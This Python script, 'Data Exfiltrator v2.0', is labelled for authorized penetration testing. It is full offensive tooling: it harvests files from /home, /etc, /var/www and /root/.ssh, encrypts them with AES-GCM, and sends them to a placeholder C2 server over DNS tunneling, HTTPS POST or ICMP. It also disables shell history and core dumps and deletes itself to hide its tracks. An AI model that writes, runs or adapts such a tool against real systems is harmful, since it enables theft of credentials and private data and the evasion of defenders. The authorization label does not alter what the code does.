#!/usr/bin/env python3
"""
Data Exfiltrator v2.0 — Authorized Penetration Testing Use Only
Exfiltrates files via DNS tunneling (fallback) or HTTPS POST with:
- AES-256-GCM encryption
- Chunking (DNS: 63-byte subdomains; HTTP: 5MB chunks)
- Optional ICMP exfiltration (ping -p payload)
- Cleanup & log suppression
"""

import os, sys, base64, json, zlib, time, socket, struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import requests, urllib3
urllib3.disable_warnings()

# ─── CONFIGURATION ────────────────────────────────────────────
EXFIL_MODE   = "dns"          # "dns", "http", "icmp"
TARGET_DIRS  = ["/home", "/etc", "/var/www", "/root/.ssh"]
EXCLUDE_EXTS = (".pyc", ".log", ".o", ".swp", ".cache")
MAX_SIZE_MB  = 100            # skip files larger than this
CHUNK_SIZE   = 200 * 1024     # chunk files this size (200KB)

# For DNS exfiltration - Requires authoritative nameserver
DNS_DOMAIN   = "exfil.your-domain.com"
DNS_SERVER   = "8.8.8.8"      # public resolver (or your C2)

# For HTTP exfiltration
C2_URL       = "https://your-c2-server.com/exfil"
BEARER_TOKEN = "supersecrettoken123"

# For ICMP exfiltration
ICMP_ID      = 0x1337
ICMP_SEQ     = 1
# ──────────────────────────────────────────────────────────────


def derive_key(password: bytes) -> bytes:
    """Derive a 256-bit key from a passphrase."""
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"exfil-v2",
    )
    return hkdf.derive(password)


def encrypt_chunk(data: bytes, key: bytes) -> bytes:
    """Encrypt data with AES-256-GCM, returns nonce + ciphertext."""
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data, None)
    return nonce + ct


def pack_metadata(original_path: str, chunk_index: int, total_chunks: int) -> bytes:
    """Serialize metadata header for each chunk."""
    meta = {
        "path": original_path,
        "chunk": chunk_index,
        "total": total_chunks,
        "ts": time.time(),
    }
    return json.dumps(meta, separators=(",", ":")).encode() + b"\n"


def scan_files(basedirs, exclude_exts, max_size_mb):
    """Yield (full_path, rel_path, size) for candidate files."""
    max_bytes = max_size_mb * 1024 * 1024
    for d in basedirs:
        if not os.path.isdir(d):
            continue
        for root, dirs, files in os.walk(d):
            # Skip hidden dirs and proc-like mounts
            dirs[:] = [x for x in dirs if not x.startswith(".") and not x.startswith("proc")]
            for f in files:
                fp = os.path.join(root, f)
                if f.startswith("."):
                    continue
                if fp.endswith(exclude_exts):
                    continue
                try:
                    sz = os.path.getsize(fp)
                except OSError:
                    continue
                if sz == 0 or sz > max_bytes:
                    continue
                try:
                    with open(fp, "rb") as fh:
                        yield fp, f, sz, fh.read()
                except (OSError, PermissionError):
                    continue


def chunk_data(data: bytes, chunk_size: int):
    """Yield fixed-size chunks from data."""
    for i in range(0, len(data), chunk_size):
        yield data[i:i+chunk_size]


def exfil_dns(payload_b64: str, domain: str, dns_server: str):
    """Exfiltrate via DNS A-record queries (base32-encoded subdomains)."""
    try:
        # Split payload into 63-char subdomain labels
        max_label = 63
        labels = []
        while payload_b64:
            labels.append(payload_b64[:max_label])
            payload_b64 = payload_b64[max_label:]
        fqdn = ".".join(labels) + "." + domain
        socket.gethostbyname(fqdn)
    except Exception:
        pass  # Lookup failure expected — data still sent


def exfil_http(data_chunk: bytes, c2_url: str, token: str):
    """Exfiltrate via HTTPS POST with Bearer auth."""
    try:
        requests.post(
            c2_url,
            data=data_chunk,
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/octet-stream",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            },
            timeout=10,
            verify=False,
        )
    except Exception:
        pass


def exfil_icmp(payload: bytes, target_ip: str):
    """Send data in ICMP echo payload (requires raw socket — usually root)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Construct minimal ICMP echo request
        header = struct.pack("!BBHHH", 8, 0, 0, ICMP_ID, ICMP_SEQ)
        # Append payload chunks (max 1472 bytes per packet)
        for i in range(0, len(payload), 1400):
            chunk = payload[i:i+1400]
            pkt = header + chunk
            # Calculate checksum
            s = 0
            for j in range(0, len(pkt), 2):
                w = pkt[j] + (pkt[j+1] << 8) if j+1 < len(pkt) else pkt[j]
                s += w
            s = (s >> 16) + (s & 0xFFFF)
            s = ~s & 0xFFFF
            pkt = struct.pack("!BBHHH", 8, 0, s, ICMP_ID, ICMP_SEQ) + pkt[8:]
            sock.sendto(pkt, (target_ip, 0))
            time.sleep(0.05)
        sock.close()
    except Exception:
        pass


def suppress_logs():
    """Minimize audit trail — disable shell history and core dumps."""
    os.environ["HISTFILE"] = "/dev/null"
    os.environ["HISTSIZE"] = "0"
    os.environ["HISTFILESIZE"] = "0"
    import resource
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    # Avoid leaving PID files
    if os.path.exists(__file__ + "c"):
        os.remove(__file__ + "c")  # remove compiled bytecode


def cleanup():
    """Try to remove the script and any temp artifacts."""
    try:
        os.remove(__file__)
    except Exception:
        pass


def main():
    suppress_logs()

    # Derive encryption key from a runtime secret (e.g., hostname + nonce)
    secret = os.uname().nodename.encode() + os.urandom(4)
    key = derive_key(secret)

    print(f"[*] Starting exfiltration from {TARGET_DIRS}")
    print(f"[*] Mode: {EXFIL_MODE.upper()} | Encrypted: AES-256-GCM")

    total_sent = 0
    files_scanned = 0

    for full_path, fname, fsize, data in scan_files(TARGET_DIRS, EXCLUDE_EXTS, MAX_SIZE_MB):
        files_scanned += 1
        chunks = list(chunk_data(data, CHUNK_SIZE))
        total_chunks = len(chunks)
        print(f"    [+] {full_path} ({fsize / 1024:.1f}KB) → {total_chunks} chunks")

        for idx, chunk in enumerate(chunks):
            # Build metadata + compress + encrypt
            meta = pack_metadata(full_path, idx, total_chunks)
            compressed = zlib.compress(meta + chunk, level=6)
            encrypted = encrypt_chunk(compressed, key)
            payload_b64 = base64.urlsafe_b64encode(encrypted).decode().rstrip("=")

            if EXFIL_MODE == "dns":
                exfil_dns(payload_b64, DNS_DOMAIN, DNS_SERVER)
            elif EXFIL_MODE == "http":
                exfil_http(encrypted, C2_URL, BEARER_TOKEN)
            elif EXFIL_MODE == "icmp":
                exfil_icmp(encrypted, "10.10.10.1")  # set target IP here

            total_sent += len(chunk)
            time.sleep(0.1)  # rate limit

    print(f"\n[*] Done. {files_scanned} files processed, {total_sent / 1024:.1f}KB encrypted & exfiltrated.")
    print(f"[*] Key material: {base64.b64encode(secret).decode()} (recover on C2 side)")
    cleanup()


if __name__ == "__main__":
    main()